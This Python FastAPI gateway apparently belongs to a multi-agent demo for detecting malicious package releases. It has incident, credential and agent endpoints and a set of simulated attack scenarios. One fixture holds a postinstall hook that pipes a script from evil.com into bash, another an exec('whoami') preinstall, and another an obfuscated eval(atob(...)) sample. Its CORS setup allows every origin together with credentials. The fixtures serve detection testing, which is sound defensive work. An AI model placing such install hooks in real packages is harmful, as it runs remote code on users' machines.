import os
import sys
import json
from pathlib import Path
from datetime import datetime
from typing import List, Optional
from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import httpx

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "packages"))
from shared.models import (
    Incident, Credential, Agent, PatchPlan, PackageReleaseEvent,
    Severity, IncidentStatus, generate_id
)
from shared.storage import Storage
from shared.transport import get_transport, SimulatorTransport
from shared.credentials import verify_proof

app = FastAPI(title="Swarm Shield Gateway API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

db_path = os.getenv("DATABASE_URL", "sqlite:///./data.db").replace("sqlite:///", "")
storage = Storage(db_path)
transport = get_transport("gateway", ["gateway", "coordinator"], "did:simulator:gateway")


class TriggerDemoRequest(BaseModel):
    package_name: str = "lodash-utils"
    scenario: str = "typosquat"  # typosquat, malicious_scripts, obfuscated


class TriggerDemoResponse(BaseModel):
    incident_id: str
    message: str


DEMO_SCENARIOS = {
    "typosquat": {
        "package_name": "lodash-utils",
        "new_version": "1.0.1",
        "prev_version": "1.0.0",
        "repo_url": "https://github.com/malicious/lodash-utils",
        "metadata": {"scripts": {}},
        "content": ""
    },
    "malicious_scripts": {
        "package_name": "express-validator-utils",
        "new_version": "2.3.0",
        "prev_version": "2.2.0",
        "repo_url": "https://github.com/malicious/express-validator-utils",
        "metadata": {
            "scripts": {
                "postinstall": "curl -s https://evil.com/payload.sh | bash",
                "preinstall": "node -e \"require('child_process').exec('whoami')\""
            }
        },
        "content": ""
    },
    "obfuscated": {
        "package_name": "react-dom-helper",
        "new_version": "0.5.0",
        "prev_version": "0.4.0",
        "repo_url": "https://github.com/malicious/react-dom-helper",
        "metadata": {"scripts": {"postinstall": "node index.js"}},
        "content": "var _0x1234=['\\x65\\x76\\x61\\x6c'];eval(atob('Y29uc29sZS5sb2coJ21hbGljaW91cycpOw=='));" + "A" * 150
    }
}


@app.get("/health")
def health():
    return {"status": "healthy", "service": "gateway-api"}


@app.get("/incidents", response_model=List[Incident])
def list_incidents():
    return storage.list_incidents()


@app.get("/incidents/{incident_id}", response_model=Incident)
def get_incident(incident_id: str):
    incident = storage.get_incident(incident_id)
    if not incident:
        raise HTTPException(status_code=404, detail="Incident not found")
    return incident


@app.post("/incidents", response_model=Incident)
def create_incident(incident: Incident):
    return storage.save_incident(incident)


@app.put("/incidents/{incident_id}", response_model=Incident)
def update_incident(incident_id: str, incident: Incident):
    existing = storage.get_incident(incident_id)
    if not existing:
        raise HTTPException(status_code=404, detail="Incident not found")
    incident.id = incident_id
    incident.updated_at = datetime.utcnow()
    return storage.save_incident(incident)


@app.get("/credentials", response_model=List[Credential])
def list_credentials(incident_id: Optional[str] = None, type: Optional[str] = None):
    return storage.list_credentials(incident_id=incident_id, cred_type=type)


@app.get("/credentials/{credential_id}", response_model=Credential)
def get_credential(credential_id: str):
    cred = storage.get_credential(credential_id)
    if not cred:
        raise HTTPException(status_code=404, detail="Credential not found")
    return cred


@app.post("/credentials", response_model=Credential)
def create_credential(credential: Credential, incident_id: Optional[str] = None):
    return storage.save_credential(credential, incident_id)


@app.get("/credentials/{credential_id}/verify")
def verify_credential(credential_id: str):
    cred = storage.get_credential(credential_id)
    if not cred:
        raise HTTPException(status_code=404, detail="Credential not found")
    
    is_valid = verify_proof(cred)
    issuer_verified = transport.verify_agent_identity(cred.issuer_did)
    
    return {
        "credential_id": credential_id,
        "signature_valid": is_valid,
        "issuer_verified": issuer_verified,
        "issuer_did": cred.issuer_did
    }


@app.get("/agents", response_model=List[Agent])
def list_agents():
    db_agents = storage.list_agents()
    
    # Also include agents from transport registry (exclude gateway itself)
    if isinstance(transport, SimulatorTransport):
        transport_agents = transport.get_all_agents()
        db_dids = {a.did for a in db_agents}
        for ta in transport_agents:
            # Skip gateway agent - it's not a security agent
            if ta.did == "did:simulator:gateway" or "gateway" in ta.capabilities:
                continue
            if ta.did not in db_dids:
                agent = Agent(
                    did=ta.did,
                    name=ta.name,
                    capabilities=ta.capabilities,
                    endpoint=ta.endpoint
                )
                storage.save_agent(agent)
                db_agents.append(agent)
    
    # Filter out gateway from final list
    return [a for a in db_agents if a.did != "did:simulator:gateway" and "gateway" not in a.capabilities]


@app.get("/agents/{did}")
def get_agent(did: str):
    agent = storage.get_agent_by_did(did)
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    return agent


@app.post("/agents", response_model=Agent)
def register_agent(agent: Agent):
    return storage.save_agent(agent)


@app.get("/patch-plans", response_model=List[PatchPlan])
def list_patch_plans(incident_id: Optional[str] = None):
    if incident_id:
        return storage.get_patch_plans_for_incident(incident_id)
    return []


@app.get("/patch-plans/{plan_id}", response_model=PatchPlan)
def get_patch_plan(plan_id: str):
    plan = storage.get_patch_plan(plan_id)
    if not plan:
        raise HTTPException(status_code=404, detail="Patch plan not found")
    return plan


SCANNER_URL = os.getenv("SCANNER_URL", "http://localhost:8001")
VERIFIER_URL = os.getenv("VERIFIER_URL", "http://localhost:8002")


async def call_scanner(event_data: dict):
    """Call scanner agent HTTP endpoint directly."""
    async with httpx.AsyncClient(timeout=30.0) as client:
        try:
            resp = await client.post(f"{SCANNER_URL}/event/release", json=event_data)
            return resp.json()
        except Exception as e:
            print(f"Failed to call scanner: {e}")
            return None


async def call_verifier(verification_data: dict):
    """Call verifier agent HTTP endpoint directly."""
    async with httpx.AsyncClient(timeout=30.0) as client:
        try:
            resp = await client.post(f"{VERIFIER_URL}/verify", json=verification_data)
            return resp.json()
        except Exception as e:
            print(f"Failed to call verifier: {e}")
            return None


@app.post("/demo/trigger", response_model=TriggerDemoResponse)
async def trigger_demo(request: TriggerDemoRequest):
    """Trigger a simulated malicious package release for demo."""
    scenario = DEMO_SCENARIOS.get(request.scenario, DEMO_SCENARIOS["typosquat"])
    
    pkg_name = request.package_name or scenario["package_name"]
    
    event = PackageReleaseEvent(
        package_name=pkg_name,
        new_version=scenario["new_version"],
        prev_version=scenario["prev_version"],
        repo_url=scenario["repo_url"],
        metadata={
            **scenario["metadata"],
            "content_sample": scenario.get("content", "")
        }
    )
    
    # Call scanner directly via HTTP (synchronous to get actual incident ID)
    event_data = json.loads(event.json())
    result = await call_scanner(event_data)
    
    # Get actual incident ID from scanner response
    incident_id = result.get("incident_id") if result else None
    
    if incident_id:
        return TriggerDemoResponse(
            incident_id=incident_id,
            message=f"Triggered {request.scenario} scenario for {pkg_name}@{scenario['new_version']}"
        )
    else:
        return TriggerDemoResponse(
            incident_id=event.id,
            message=f"Triggered {request.scenario} scenario (scanner processing)"
        )


@app.post("/demo/seed")
def seed_demo_data():
    """Seed initial demo data including sample incidents and agents."""
    # Register demo agents
    demo_agents = [
        Agent(
            did="did:simulator:scanner",
            name="Scanner Agent",
            capabilities=["security_scan", "dependency_analysis"],
            endpoint="http://scanner-agent:8001",
            status="online"
        ),
        Agent(
            did="did:simulator:verifier",
            name="Verifier Agent",
            capabilities=["security_verify", "incident_response"],
            endpoint="http://verifier-agent:8002",
            status="online"
        ),
        Agent(
            did="did:simulator:ci",
            name="CI Agent",
            capabilities=["ci_policy", "release_gatekeeping"],
            endpoint="http://ci-agent:8004",
            status="online"
        ),
        Agent(
            did="did:simulator:patch",
            name="Patch Agent",
            capabilities=["autofix", "patch_planner"],
            endpoint="http://patch-agent:8003",
            status="online"
        )
    ]
    
    for agent in demo_agents:
        storage.save_agent(agent)
    
    return {"message": "Demo data seeded", "agents_created": len(demo_agents)}


if __name__ == "__main__":
    port = int(os.getenv("GATEWAY_PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
